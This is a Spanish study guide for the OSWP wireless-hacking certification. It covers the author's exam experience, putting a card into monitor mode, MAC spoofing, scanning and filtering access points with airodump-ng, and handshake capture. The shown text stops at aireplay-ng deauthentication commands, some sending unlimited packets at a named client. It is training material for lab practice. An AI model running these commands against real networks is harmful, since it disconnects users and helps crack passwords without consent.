# Preparación para el OSWP (by s4vitar)

![OSWP Image](https://funkyimg.com/i/2VTJW.jpg)
#### Offensive Security Wireless Attacks (WiFu) course and Offensive Security Wireless Professional (OSWP) Cheat Sheet

## Índice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Estructura de los apuntes](#estructura-de-los-apuntes)
     * [Redes WPA](#redes-wpa)
       * [Conceptos básicos](#conceptos-básicos)
       * [Modo monitor](#modo-monitor)
       * [Configuración de la tarjeta de red y tips](#configuración-de-la-tarjeta-de-red-y-tips)
       * [Análisis del entorno](#análisis-del-entorno)
       * [Modos de filtro](#modos-de-filtro)
       * [Exportación de evidencias](#exportación-de-evidencias)
       * [Concepto de Handshake](#concepto-de-handshake)
       * [Técnicas para capturar un Handshake](#técnicas-para-capturar-un-handshake)
            * [Ataque de Deautenticación dirigido](#ataque-de-deautenticación-dirigido)
            * [Ataque de Deautenticación global (Broadcast MAC Address)](#ataque-de-deautenticación-global)
            * [Ataque de Autenticación](#ataque-de-autenticación)
            * [CTS Frame Attack - Secuestro del Ancho de Banda](#cts-frame-attack)
            * [Beacon Flood Mode Attack](#beacon-flood-mode-attack)
            * [Disassociation Amok Mode Attack](#disassociation-amok-mode-attack)
            * [Michael Shutdown Exploitation](#michael-shutdown-exploitation)
            * [Técnicas pasivas](#técnicas-pasivas)
        * [Validación del Handshake con Pyrit](#validación-del-handshake-con-pyrit)
        * [Tratamiento y filtro de la captura](#tratamiento-y-filtro-de-la-captura)
        * [Parseador para redes del entorno](#parseador-para-redes-del-entorno)
        * [Análisis de paquetes de red con Tshark](#análisis-de-paquetes-de-red-con-tshark)
        * [Extracción del hash en el Handshake](#extracción-del-hash-en-el-handshake)
        * [Fuerza bruta con John](#fuerza-bruta-con-john)
        * [Fuerza bruta con Aircrack](#fuerza-bruta-con-aircrack)
        * [Fuerza bruta con Hashcat](#fuerza-bruta-con-hashcat)
        * [Proceso de ataque con Bettercap](#proceso-de-ataque-con-bettercap)
        * [Técnicas de aumento de la velocidad de cómputo](#técnicas-de-aumento-de-la-velocidad-de-cómputo)
            * [Concepto de Rainbow Table](#concepto-de-rainbow-table)
            * [Cracking con Pyrit](#cracking-con-pyrit)
            * [Cracking con Cowpatty](#cracking-con-cowpatty)
            * [Cracking con Airolib](#cracking-con-airolib)
            * [Rainbow Table con GenPMK](#rainbow-table-con-genpmk)
            * [Cracking con Pyrit frente a Rainbow Table](#cracking-con-pyrit-frente-a-rainbow-table)
            * [Cracking con Cowpatty frente a Rainbow Table](#cracking-con-cowpatty-frente-a-rainbow-table)
            * [Cracking con Pyrit a través de ataque por base de-datos](#cracking-con-pyrit-a-través-de-ataque-por-base-de-datos)
        * [Técnicas de espionaje](#técnicas-de-espionaje)
            * [Uso de Airdecap para el desencriptado de paquetes](#uso-de-airdecap-para-el-desencriptado-de-paquetes)
            * [Análisis del desencriptado con Tshark y Wireshark](#análisis-del-desencriptado-con-tshark-y-wireshark)
            * [Concepto de enrutamiento](#concepto-de-enrutamiento)
            * [Espionaje con Ettercap y Driftnet + enrutamiento con iptables](#espionaje-con-ettercap-y-driftnet-+-enrutamiento-con-iptables)
        * [Ataques graciosos](#ataques-graciosos)
            * [Uso de Xersoploit](#uso-de-xerosploit)
            * [Reemplazado de imágenes web](#reemplazado-de-imágenes-web)
            * [Ataque Shaking Web](#ataque-shaking-web)
        * [Ataque DNS Spoofing](#ataque-dns-spoofing)
        * [Evil Twin Attack](#evil-twin-attack)
           * [Creación de fichero DHCP](#creación-de-fichero-dhcp)
           * [Configuración de página web](#configuración-de-página-web)
           * [Inicialización de servicios](#inicialización-de-servicios)
           * [Creación de base de datos via MYSQL](#creación-de-base-de-datos-via-mysql)
           * [Creación de falso punto de acceso via Airbase](#creación-de-falso-punto-de-acceso-via-airbase)
           * [Creación de interfaz y asignación de segmentos](#cración-de-interfaz-y-asignación-de-segmentos)
           * [Control y creación de reglas de enrutamiento por iptables](#control-y-creación-de-reglas-de-enrutamiento-por-iptables)
           * [Sincronización de reglas definidas con el Fake AP](#sincronización-de-reglas-definidas-con-el-fake-ap)
           * [Robo de datos](#robo-de-datos)
        * [Generación de contraseñas con crunch](#generación-de-contraseñas-con-crunch)
        * [Ataques por WPS](#ataques-por-wps)
            * [Uso de Reaver y pixiewps](#uso-de-reaver-y-pixiewps)
            * [Tips con WPSApp](#tips-con-wpsapp)
            * [Ataques por WPS](#ataques-por-wps)
            * [Uso de Wifimosys](#uso-de-wifimosys)
            * [Uso de Linset](#uso-de-linset)
        * [Ataque a redes sin clientes](#ataque-a-redes-sin-clientes)
            * [Client-less PKMID Attack](#client--less-pmkid-attack)
                * [Ataque desde Bettercap](#ataque-desde-bettercap)
                * [Uso de hcxpcaptool](#uso-de-hcxpcaptool)
                * [Ataque via hcxdumptool](#ataque-via-hcxdumptool)
        * [Redes WPA Ocultas](#redes-wpa-ocultas)
        * [Redes WEP](#redes-wep)

            
            
       

Antecedentes
===============================================================================================================================
Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le
sirva de inspiración para aquel que pretenda sacarse la certificación.

#### ¿Es difícil la certificación?

![Certificado Físico](https://funkyimg.com/i/2VTgJ.jpeg)

A diferencia del OSCP, encontré bastante sencillo el curso, pero todo tiene su explicación. 

Cuando empecé con el Hacking, lo primero que toqué fue la parte WiFi, por lo que esta parte la tenía más que
controlada antes de empezar. En cuanto a aprendizaje, aprendí una o dos cosas nuevas, lo cual es
excitante, pero a groso modo os puedo decir que por mi cuenta de manera autodidacta abarqué mucho más temario
del que presentaba el curso.

Por ello hago este Gist, no sólo para comentar las técnicas que necesitáis tener controladas, sino para
enseñaros un par de trucos y vectores de ataque que no están de más guardarlos bajo la manga.

#### ¿Qué plan me pillo?

En mi caso me pillé un mes de curso, pero al tercer día de pagarlo me presenté al examen. Para aquellos que no
estén experimentados con la temática WiFi, os puedo decir que con un mes tenéis de sobra, ya que no requiere
tanta dedicación como el OSCP.

Eso sí, hay multitud de comandos y distintos casos, por lo que sobra decir que practicar siempre hay que
practicar. 

En este caso el curso no dispone de laboratorio, por lo que será necesario montarse un laboratorio
en local donde practicar los distintos casos. Para los interesados, todos los laboratorios los monté con un
'**TP-Link**', un simple repetidor desde el cual podía configurar si la red quería que fuera de protocolo WPA
o de protocolo WEP con sus distintos modos de autenticación.

#### ¿Qué bases tuve antes de comenzar con la certificación?

Como dije anteriormente, tenía altamente controlada la parte WiFi, por lo que el estudio de los ataques a
redes WPA y WEP no supuso ningún problema. La guía que te entregan junto a los vídeos están perfectamente
estructurados, y cuentas con todo lo necesario para enfrentarte al examen.

#### ¿Qué pasos me recomiendas para abordar con éxito la certificación?

Recomiendo montar un laboratorio en local para practicar todos los vectores de ataque vistos durante el curso.

Para abordar con éxito la certificación, es necesario que sepas al dedillo cómo manejarte en las siguientes
situaciones, siguiendo como objetivo obtener la contraseña del punto de acceso inalámbrico:

* Ataques a redes WPA con autenticación PSK
* Ataques a redes WEP con clientes sin autenticación SKA
* Ataques a redes WEP con clientes y autenticación SKA
* Ataques a redes WEP sin clientes

Ahora bien, para cada caso, hay distintas formas de efectuar el procedimiento, ya que depende a su vez del
tráfico de la red, la calidad de los paquetes capturados y distintos factores.

#### ¿Cómo está estructurado el examen?

El examen tiene una duración de cuatro horas, te conectas a una máquina por VPN la cual dispone de una tarjeta
de red configurada y a partir de ahí escaneas el entorno.

En el entorno, hay un total de tres puntos de acceso que debes vulnerar, cada uno de ellos representando un
caso diferente. Para aprobar el examen, debes averiguar la contraseña de los tres AP's, pues en caso contrario
no te aprueban.

La gran pregunta, ¿son cuatro horas suficientes?, mi respuesta es más que suficiente. En mi caso en una media
hora aproximada ya había terminado el examen (lo cual me sorprendió). Recomiendo tener todos los comandos
apuntados para cada caso, eso os permitirá ir a tiro hecho.

#### ¿Tuve problemas a la hora de practicar con el laboratorio en local?

Como dije anteriormente, esta certificación no dispone de laboratorio, lo que te obliga a montarte tu propio
laboratorio en local para practicar.

Los únicos ataques que no pude replicar fueron el **Chop Chop de Korek** y el **Fragmentation Attack**,
empleado para redes que no disponen de clientes asociados. Este mismo problema lo he visto en más gente,
leyendo en artículos donde detallaban el mismo inconveniente. Al parecer depende del modelo de router que
tengas. 

En la web de Offensive se cita el modelo a usar para practicar los vectores de ataque, pero como
comprenderéis, no iba a gastar dinero por poder hacer dos ataques. Por lo demás, el resto de ataque los pude
replicar correctamente.

#### ¿Cuáles son los siguientes pasos?

La siguiente certificación que me estoy preparando es el **eWPT**, una certificación de Pentesting Web
bastante valorada y orientada a Bug Bounty. Si me animo puede que mate dos pájaros de un tiro y tras tenerla
pruebe a hacer el **AWAE** de Offensive Security, ya que estaré bien fresco de ideas una vez finalice el otro.

Por si os interesa, el **eWPT** dispone de un plan (que es el que he pagado) que os permite tener un
laboratorio de máquinas de por vida sobre los que practicar Pentesting Web, el cual os actualizan
frecuentemente.

Estructura de los apuntes
===============================================================================================================================

Para facilitar la repartición de apuntes, intuyo que es buena idea dividirlo por un lado en ataques a redes
WPA y por otro lado en ataques a redes WEP con sus distintos casos, ¡así que así lo haremos Mike!

## Redes WPA
Este apartado engloba todos los vectores de ataque y técnicas ofensivas destinadas al protocolo WPA.

### Conceptos básicos

Hay que aclarar una serie de conceptos clave antes de empezar. La mayoría de los ataques que vamos a ver,
además de en ocasiones servir para molestar... van destinados a obtener la contraseña de una red inalámbrica.

El por qué es necesario realizar un ataque para obtener la contraseña es algo que veremos en los siguientes
puntos. Hay que tener en cuenta que al tratarse de una autenticación de tipo PSK (Pre-Shared-Key), se está
haciendo uso de una clave pre-compartida como su nombre indica, una contraseña única que de estar a
disposición de cualquiera puede ser usada para llevar a cabo una asociación contra el AP.

A la hora de llevar a cabo una asociación por una estación (**cliente**) contra el AP, se deja un rastro a
nivel de paquetes (eapol), los cuales como atacante, pueden ser capturados y tratados sin estar autenticados
al punto de acceso para posteriormente extraer la contraseña de la red inalámbrica.

Todo esto explicado de una manera no técnica para no entrar en materia tan rápido, ya a medida que vayamos
avanzando se irá analizando mas a bajo nivel cómo funciona todo :)

### Modo monitor

Hay que pensar que estamos rodeados de paquetes por todos lados, paquetes que no somos capaces de percibir,
paquetes que contienen información del entorno por el que nos movemos. 

Estos paquetes pueden ser capturados con tarjetas de red que acepten el modo monitor. El **modo monitor**, no
es más que un modo por el cual podemos escuchar y capturar todos los paquetes que viajen por el aire. Tal vez
lo mejor de todo es que no sólo podemos capturarlos, sino también manipularlos (veremos algunos ataques
interesantes más adelante).

Para comprobar si nuestra tarjeta de red acepta el modo monitor, haremos una prueba en el siguiente apartado.

### Configuración de la tarjeta de red y tips

Empecemos con un par de comandos básicos. A continuación os listo mi tarjeta de red:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.187  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::1d28:6b2b:a941:5796  prefixlen 64  scopeid 0x20<link>
        ether e4:70:b8:d3:93:5d  txqueuelen 1000  (Ethernet)
        RX packets 6426576  bytes 9229384163 (8.5 GiB)
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 1160899  bytes 162727829 (155.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Espero que a partir de ahora os llevéis bien con ella, pues con esta practicaremos la mayoría de ataques.

Para poner en modo monitor nuestra tarjeta de red, es tan simple como aplicar el siguiente comando:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

  PID Name
  818 avahi-daemon
  835 wpa_supplicant
  877 avahi-daemon
 5398 NetworkManager
18308 dhclient

PHY	Interface	Driver		Chipset

phy0	wlan0		iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
```

Ahora bien, cosas a tener en cuenta. Cuando estamos en modo monitor, perdemos conectividad a internet. Este
modo no admite conexión a internet, por lo que no os asustéis si de pronto veis que no podéis navegar. Veremos
cómo deshabilitar este modo para que todo vuelva a la normalidad.

Cabe decir que al iniciar este modo, se generan una serie de **procesos conflictivos**. Esto es así dado que
por ejemplo, si no vamos a tener acceso a internet... ¿por qué tener corriendo los procesos '**dhclient**' y
'**wpa_supplicant**'?, es algo absurdo, e incluso la propia suite nos lo recuerda... pues se encargan de darnos
conectividad y mantenernos con conexión en una red ya estando asociados, lo cual en este caso... no aplica.

Matar estos procesos es sencillo, tenemos la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pkill dhclient && pkill wpa_supplicant
```

O si deseamos tirar de la propia suite:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng check kill

Killing these processes:

  PID Name
  835 wpa_supplicant
```

Ya con esto, nuestra tarjeta de red está en modo monitor. Una forma de comprobar si estamos en modo monitor es
listando nuestras interfaces de red. Ahora nuestra red **wlan0** debería llamarse **wlan0mon**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig | grep wlan0 -A 6
wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 63  bytes 12032 (11.7 KiB)
        RX errors 0  dropped 63  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Una vez llegados a este punto, se podría decir que ya somos capaces de capturar todos los paquetes que viajan
por nuestro alrededor, pero dejaremos esto para el siguiente punto.

Importante, ¿cómo desactivar el modo monitor y hacer que todo vuelva a la normalidad en términos de
conectividad?, sencillo. Podemos hacer uso de los siguientes comandos para restablecer la conexión:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng stop wlan0mon && service network-manager restart

PHY	Interface	Driver		Chipset

phy0	wlan0mon	iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 station mode vif enabled on [phy0]wlan0)

		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ping -c 10 -i 0.01 -q google.es
PING google.es (172.217.17.3) 56(84) bytes of data.

--- google.es ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 309ms
rtt min/avg/max/mdev = 28.718/29.565/29.985/0.427 ms, pipe 3
```

Por lo que fuera malestares y preocupaciones, no hay que tirar el ordenador a la basura. 

Pero esto no es suficiente. A pesar de no estar conectados a ninguna red y no disponer de direccion IP, lo que
en sí puede dejar rastro es nuestra dirección MAC. 

La dirección MAC al fin y al cabo es como el DNI de cada dispositivo, es lo que identifica un dispositivo
móvil, un router, un ordenador, etc. Sería feo estar haciendo cierto tipo de ataques actuando bajo una
dirección MAC que se nos asocie, es lo equivalente a hacer un atraco con pasamontañas pero llevar una cartera
con nuestro DNI dentro del bolsillo y que en un descuido se nos caiga al suelo quedando a la exposición de
todos los demás.

Una buena practica consiste en falsificar la dirección MAC, y no hace falta saber de electrónica o Hardware
para ello. A través de la utilidad **macchanger**, podemos jugar con la dirección MAC de nuestro dispositivo
para manipularla a nuestro antojo.

Por ejemplo, imaginemos que quiero asignar a mi tarjeta de red una dirección MAC de la **NATIONAL SECURITY
AGENCY** (**NSA**), ¿cómo se procedería?. Primero buscamos la dirección MAC en el amplio listado del que
dispone 'macchanger':

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger -l | grep -i "national security agency"
8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY
```
Estos tres primeros pares listados corresponden a lo que se conoce como **Organizationally Unique
Identifier**, un simple número de 24 bits que identifica al vendor, manufacturer u otra organización.

Una dirección MAC está compuesta por 6 bytes, ya tenemos los primeros 3 bytes, ¿qué hay de los otros 3 bytes?.
Los 24 bits restantes corresponden a lo que se conoce como **Universally Administered Address**, y sinceramente...
en mis prácticas, siempre me la invento.

Es decir, que si quisiera falsificar una dirección MAC registrada bajo el **OUI** de la NSA, podría hacer lo
siguiente:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0mon down
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo "$(macchanger -l | grep -i "national security agency" | awk '{print $3}'):da:1b:6a"
00:20:91:da:1b:6a
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger --mac=$(!!) wlan0mon
Current MAC:   e4:70:b8:d3:93:5c (unknown)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
New MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0mon up
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger -s wlan0mon
Current MAC:   00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
```

Aspectos a tener en cuenta de lo anterior:

* Es necesario dar de baja la interfaz de red para manipular su dirección MAC, pues de lo contrario el propio
  'macchanger' nos avisará de que es necesario darla de baja.

* Con la utilidad '--mac', podemos especificar la dirección MAC a utilizar para la interfaz de red
  especificada.

* Una vez aplicados los cambios, damos de alta la interfaz y con el parámetro '-s' (**show**), validamos que
  nuestra tarjeta de red corresponde al **OUI** asignado.

Perfecto, si has llegado a este punto podemos continuar.

### Análisis del entorno

Llega el momento interesante. Ahora que estamos en modo monitor, para capturar todos los paquetes de nuestro
alrededor, podemos hacer uso del siguiente comando:

```bash
airodump-ng wlan0mon
```

**IMPORTANTE**: Aunque tal vez lo debería haber mencionado en el anterior punto, no todas las tarjetas de red
tienen por qué llamarse **wlan0**, pueden tener un nombre distinto (Ej: **wlp2s0**), por lo que habrá que
tener en cuenta su nombre para acompañarlo junto al comando a aplicar.

Al correr el comando citado anteriormente, obtenemos el siguiente resultado:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1                                
```

Entonces bien, ¿cómo se interpreta este output?. 

De los campos más importantes por el momento, por un lado tenemos el campo **BSSID**, donde siempre podremos
corroborar cuál es la dirección MAC del punto de acceso. Por otro lado, contamos con el campo **PWR**, donde a
modo de consideración, a más cerca esté del valor 0, podremos decir que más cerca nos situamos del AP.

El campo **CH**, indica el canal en el que se sitúa el AP. Cada AP, está posicionado en un canal distinto, con
el objetivo de evitar que se dañe el espectro de onda entre las múltiples redes del entorno. Existe un ataque
justamente de denegación de servicio, que se encarga de generar múltiples Fake AP's situados en el mismo canal
que en el del AP objetivo, consiguiendo así que la red queda inoperativa temporalmente (lo veremos más
adelante).

Por otro lado, los campos **ENC, CIPHER** y **AUTH**, donde podremos comprobar siempre con qué tipo de red
estamos tratando. La mayoría de redes domésticas cumplen la encriptación WPA/WPA, con cifrado CCMP y modo de
autenticación PSK.

En el campo **ESSID**, podremos siempre saber el nombre de la red con la que estamos tratando, pudiendo así en
una misma línea a través del campo **BSSID** saber cuál es su dirección MAC, de utilidad para cuando
comencemos con la fase de filtrado.

El campo **DATA**, por el momento no lo tocaremos, ya que nos meteremos a fondo con este cuando tratemos las
redes de protocolo **WEP**. 

Asimismo, en la parte inferior, podemos ver otros datos que están siendo capturados con la herramienta. Esta
sección corresponde a la de los clientes. Consideraremos una estación como un cliente asociado. Para el
ejemplo mostrado, existe una estación con dirección MAC **34:41:5D:46:D1:38** asociado al **BSSID**
'20:34:FB:B1:C5:53', donde de manera inmediata en la parte superior podemos ver que se trata de la red
**hacklab**, por lo que ya sabemos que dicha red cuenta con un cliente asociado.

Es posible que en ocasiones lleguemos a capturar estaciones que no están asociadas a ningún punto de acceso,
el cual en este caso se indicará con un '**not associated**' en el campo **BSSID**. Es a través del campo
**Frames** de las estaciones, donde podremos ver qué tipo de actividad tiene el cliente sobre dicho AP. Si los
Frames aumentan considerablemente a intervalos cortos de tiempo, esto quiere decir que la estación se
encuentra activa en el momento de la captura.

### Modos de filtro

Aunque es una maravilla poder capturar todos los AP's y estaciones de nuestro entorno, como atacante siempre
nos interesará atentar contra un AP específico. Por ello, introducimos en este punto los modos de filtro
disponibles desde la herramienta para capturar aquellos puntos de acceso deseados.

Volvamos al caso de antes:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1  
 ```

 Imaginemos que queremos filtrar para que sólo se lista el punto de acceso cuyo **ESSID** es **hacklab**, ¿qué
 podemos recaudar de primeras de esta red?

 * El AP se sitúa en el canal 1
 * El AP posee dirección MAC  20:34:FB:B1:C5:53
 * El AP posee ESSID hacklab

Generalmente con 2 datos ya es suficiente para llevar a cabo el filtro. Para este caso, podríamos filtrar la
red en cuestión de las siguientes formas:

* airodump-ng -c 1 --essid hacklab wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

Para cualquiera de las formas representadas, obtendríamos los siguientes resultados:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

### Exportación de evidencias

Ahora bien, a efectos prácticos, nos encontramos en la misma situación que al principio. Como atacantes, lo
que nos interesa siempre es recolectar la información del AP objetivo. En este caso, estamos monitorizando el
tráfico del AP **hacklab**, pero sin generar evidencias.

Resulta más interesante capturar y exportar todo el tráfico que se monitorea a un fichero, con el propósito de
posteriormente poder analizarlo. Para ello se hace uso de la misma sintaxis pero incorporando el parámetro
'**-w**', donde seguidamente especificamos el nombre del fichero:

* airodump-ng -c 1 -w Captura --essid hacklab wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

De esta forma, una vez comienza el escaneo, se generan los siguientes ficheros en nuestro directorio de
trabajo:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  Captura-01.csv  Captura-01.kismet.csv  Captura-01.kismet.netxml  Captura-01.log.csv
```
Realmente, de todos estos ficheros, con el que la gran mayoría de veces trabajaremos es con el que tiene
extensión '.cap', esto es así dando que es el que contendrá el ** Handshake** capturado, con el que trataremos
en breve.

### Concepto de Handshake

Por cada vez que una estación se asocia o re-asocia a un AP, durante el proceso de asociación viaja la
contraseña del AP encriptada. A efectos prácticos, se dice siempre que el **Handshake** en estos casos se
genera en el momento en el que un cliente se re-conecta a la red. 

Como estamos monitorizando todo el tráfico de la red en un fichero... viene de maravilla capturar una
re-asociación, pues esta autenticación dejará rastro en nuestra captura y seremos capaces de visualizar la
contraseña encriptada de la red.

Podrías pensar, ¿entonces tengo que quedarme esperando hasta que por X razón una estación se re-asocie al AP?,
no exactamente. Ese tipo de escenario se le consideraría escenario pasivo, pues nosotros como atacantes no
estaríamos interviniendo para manipular el tráfico del AP. 

Existe un escenario activo, el cual pondremos en práctica, donde como atacantes somos capaces de elaborar
externamente sin estar asociados a un AP, un ataque de de-autenticación, consiguiendo así expulsar a uno o
múltiples clientes de una red inalámbrica sin consentimiento.

Un Handshake al fin y al cabo quedará marcado como un Hash, el cual podremos extraer de la captura
posteriormente para iniciar un ataque de fuerza bruta.

### Técnicas para capturar un Handshake

A continuación, se representan distintas técnicas con el propósito de capturar un Handshake de la red fijada
como objetivo.

#### Ataque de deautenticación dirigido

El protocolo IEEE 802.11 (Wi-Fi), contiene la provisión para un **marco de deautenticación**. Como atacantes,
para este ataque lo que haremos será enviar un marco de deautenticación al punto de acceso inalámbrico
objetivo, especificando la dirección MAC del cliente que queremos que sea expulsado de la red.

El proceso de enviar dicho marco al punto de acceso se denomina '**Técnica autorizada para informar a una
estación no autorizada que se ha desconectado de la red**'.

En otras palabras, estaríamos poniendo en práctica el siguiente esquema:

<img align="center" src="https://funkyimg.com/i/2W6cB.png">

Para retomar la captura por donde lo habíamos dejado, os vuelvo a representar el caso:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

Por tanto, tenemos un cliente **34:41:5D:46:D1:38** asociado al AP **hacklab**. Tratemos de expulsarlo del
punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de **aireplay-ng**.

'**Aireplay-ng**' cuenta con diferentes modos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\s*$/d' | sed 's/^ *//'; echo

--deauth      count : deauthenticate 1 or all stations (-0)
--fakeauth    delay : fake authentication with AP (-1)
--interactive       : interactive frame selection (-2)
--arpreplay         : standard ARP-request replay (-3)
--chopchop          : decrypt/chopchop WEP packet (-4)
--fragment          : generates valid keystream   (-5)
--caffe-latte       : query a client for new IVs  (-6)
--cfrag             : fragments against a client  (-7)
--migmode           : attacks WPA migration mode  (-8)
--test              : tests injection and quality (-9)
```

Para este caso, nos interesa el parámetro '**-0**', el cual también puede ser usado con el parámetro
'**--deauth**'.

La sintaxis sería la siguiente:

* aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

**CONSIDERACIONES**: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no
hacerlo, es probable que el ataque de deautenticación no funcione, pues **aireplay** no sabe sobre qué canal
operar.

Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes
de de-autenticación a la estación objetivo, haciendo así que esta se desasocie de la red. Al igual que se han
especificado 10 paquetes, su valor puede incrementarse al valor deseado. 

Es posible incluso especificar un valor '**0**', haciéndole saber así a **aireplay** que queremos enviar un
número infinito/ilimitado de paquetes de deautenticación a la estación objetivo:

* aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en vez de su **ESSID**:

* aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon

Obteniendo los siguientes resultados:

```bash
